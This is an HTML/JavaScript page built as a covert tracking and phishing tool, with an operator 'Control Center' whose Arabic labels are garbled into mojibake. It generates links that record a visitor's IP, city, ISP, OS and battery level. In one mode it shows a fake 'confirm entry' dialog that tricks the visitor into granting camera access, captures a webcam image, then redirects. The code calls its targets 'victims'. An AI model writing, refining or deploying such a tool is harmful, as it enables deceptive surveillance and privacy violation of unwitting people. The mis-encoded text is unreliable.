<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard v3.0</title>
    <style>
        :root { --bg: #030303; --card: #0a0a0a; --neon-blue: #00d2ff; --neon-green: #39ff14; --text: #e0e0e0; --glass: rgba(255, 255, 255, 0.05); }
        body { margin: 0; background: var(--bg); font-family: 'Segoe UI', Roboto, sans-serif; color: var(--text); overflow-x: hidden; }
        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        
        .admin-box { 
            background: var(--card); padding: 35px; border-radius: 15px; width: 100%; max-width: 450px; 
            border: 1px solid #1a1a1a; box-shadow: 0 0 30px rgba(0, 210, 255, 0.1);
            backdrop-filter: blur(10px); transition: 0.4s;
        }

        h2 { text-align: center; color: var(--neon-blue); margin-bottom: 30px; font-weight: 200; letter-spacing: 3px; text-transform: uppercase; }
        
        .mode-container { display: flex; gap: 15px; margin-bottom: 25px; }
        .mode-card { 
            flex: 1; background: var(--glass); border: 1px solid #222; padding: 20px; border-radius: 12px; 
            text-align: center; cursor: pointer; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .mode-card.active { border-color: var(--neon-blue); background: rgba(0, 210, 255, 0.05); transform: translateY(-5px); box-shadow: 0 5px 15px rgba(0, 210, 255, 0.2); }
        .mode-card b { font-size: 14px; display: block; }

        input { 
            width: 100%; padding: 15px; background: #000; border: 1px solid #222; border-radius: 10px; 
            color: #fff; margin-bottom: 20px; box-sizing: border-box; transition: 0.3s;
        }
        input:focus { border-color: var(--neon-blue); outline: none; }

        .main-btn { 
            background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: #000; border: none; 
            padding: 16px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; 
            font-size: 14px; text-transform: uppercase; transition: 0.3s;
        }
        .main-btn:hover { filter: brightness(1.2); transform: scale(1.02); }

        .result-box { 
            margin-top: 25px; padding: 15px; background: #000; border-radius: 10px; 
            border: 1px dashed var(--neon-green); display: none; animation: fadeIn 0.5s;
        }

        #log-area { margin-top: 30px; display: none; animation: slideUp 0.6s; }
        .data-log { background: #050505; padding: 20px; border-radius: 12px; border-right: 3px solid var(--neon-green); }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; border-bottom: 1px solid #111; padding-bottom: 5px; }
        .info-row span { color: var(--neon-blue); }

        /* ÙØ§Ø¬ÙØ© Ø§ÙØ¶Ø­ÙØ© */
        .victim-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .dialog { background: #080808; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #1a1a1a; width: 85%; max-width: 320px; }
        .hidden { display: none !important; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    </style>
</head>
<body>

<div class="container">
    <div id="admin-panel" class="admin-box">
        <h2>Control Center</h2>
        
        <div class="mode-container">
            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')">
                <b>Ø³Ø­Ø¨ Ø¨ÙØ§ÙØ§Øª Ø§ÙØ¶Ø­ÙØ©</b>
            </div>
            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')">
                <b>Ø³Ø­Ø¨ ØµÙØ±</b>
            </div>
        </div>

        <input type="text" id="targetUrl" placeholder="Ø£Ø¯Ø®Ù Ø±Ø§Ø¨Ø· Ø§ÙÙØ¬ÙØ©">
        <button class="main-btn" onclick="generateLink()">ØªÙÙÙØ¯ Ø§ÙØ±Ø§Ø¨Ø·</button>

        <div id="resultBox" class="result-box">
            <p style="font-size:10px; color:var(--neon-green); margin-bottom:10px;">Ø§ÙØ±Ø§Ø¨Ø· Ø§ÙÙØ´ÙØ±:</p>
            <input type="text" id="copyLink" readonly onclick="this.select()">
        </div>

        <div id="log-area">
            <div class="data-log">
                <p style="color:var(--neon-blue); font-size:12px; margin-bottom:15px;">ð¡ Ø§ÙØªÙØ§Ø±ÙØ± Ø§ÙÙØ§Ø±Ø¯Ø©:</p>
                <div id="device-data"></div>
                <div id="image-data" class="hidden">
                    <img id="captured-img" style="width:100%; border-radius:8px; margin-top:15px; border:1px solid #333;">
                    <a id="download-link" download="report.jpg" style="display:block; color:var(--neon-green); font-size:11px; text-align:center; margin-top:10px; text-decoration:none;">ØªØ­ÙÙÙ Ø§ÙÙØ³Ø§Ø¦Ø·</a>
                </div>
            </div>
        </div>
    </div>
</div>

<div id="victim-ui" class="victim-overlay hidden">
    <div class="dialog">
        <h3 style="color:#fff; font-weight:300;">ØªØ£ÙÙØ¯ Ø§ÙØ¯Ø®ÙÙ</h3>
        <p style="color: #666; font-size:13px;">ÙØ±Ø¬Ù Ø§ÙØ³ÙØ§Ø­ Ø¨Ø§ÙÙØµÙÙ ÙÙÙØ§ÙÙØ±Ø§ ÙÙÙØªØ§Ø¨Ø¹Ø© Ø¥ÙÙ Ø§ÙÙØ­ØªÙÙ Ø§ÙÙØ·ÙÙØ¨Ø©.</p>
        <button id="cameraBtn" class="main-btn" style="margin-top:15px;">ÙØªØ§Ø¨Ø¹Ø©</button>
    </div>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
</div>

<script>
    let activeMode = '1'; // 1 = Ø¨ÙØ§ÙØ§Øª Ø 2 = ØµÙØ±
    const urlParams = new URLSearchParams(window.location.search);
    const vMode = urlParams.get('v');

    function selectMode(mode, id) {
        activeMode = mode;
        document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }

    if (vMode) {
        document.getElementById('admin-panel').classList.add('hidden');
        
        async function startProtocol() {
            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
            
            const payload = {
                ip: ipData.ip || "N/A",
                city: ipData.city || "Unknown",
                isp: ipData.org || "Unknown",
                os: navigator.platform,
                batt: batt ? (batt.level * 100).toFixed(0) + "%" : "N/A"
            };
            localStorage.setItem('rep_info', JSON.stringify(payload));

            const redir = localStorage.getItem('redir_to') || 'https://google.com';

            if (vMode === '1') {
                window.location.href = redir;
            } else {
                document.getElementById('victim-ui').classList.remove('hidden');
                document.getElementById('cameraBtn').onclick = async () => {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        setTimeout(() => {
                            const canvas = document.getElementById('canvas');
                            canvas.width = 640; canvas.height = 480;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            localStorage.setItem('rep_img', canvas.toDataURL('image/jpeg'));
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = redir;
                        }, 800);
                    } catch { window.location.href = redir; }
                };
            }
        }
        startProtocol();
    }

    function generateLink() {
        const val = document.getElementById('targetUrl').value;
        if (!val) return;
        localStorage.setItem('redir_to', val);
        document.getElementById('copyLink').value = window.location.href.split('?')[0] + "?v=" + activeMode;
        document.getElementById('resultBox').style.display = 'block';
    }

    window.addEventListener('storage', (e) => {
        document.getElementById('log-area').style.display = 'block';
        if (e.key === 'rep_info') {
            const d = JSON.parse(e.newValue);
            document.getElementById('device-data').innerHTML = `
                <div class="info-row">Ø¹ÙÙØ§Ù IP: <span>${d.ip}</span></div>
                <div class="info-row">Ø§ÙÙØ¯ÙÙØ©: <span>${d.city}</span></div>
                <div class="info-row">Ø§ÙÙØ²ÙØ¯: <span>${d.isp}</span></div>
                <div class="info-row">ÙØ¸Ø§Ù Ø§ÙØªØ´ØºÙÙ: <span>${d.os}</span></div>
                <div class="info-row">Ø§ÙØ¨Ø·Ø§Ø±ÙØ©: <span>${d.batt}</span></div>
            `;
        }
        if (e.key === 'rep_img') {
            document.getElementById('image-data').classList.remove('hidden');
            document.getElementById('captured-img').src = e.newValue;
            document.getElementById('download-link').href = e.newValue;
        }
    });
</script>
</body>
</html>
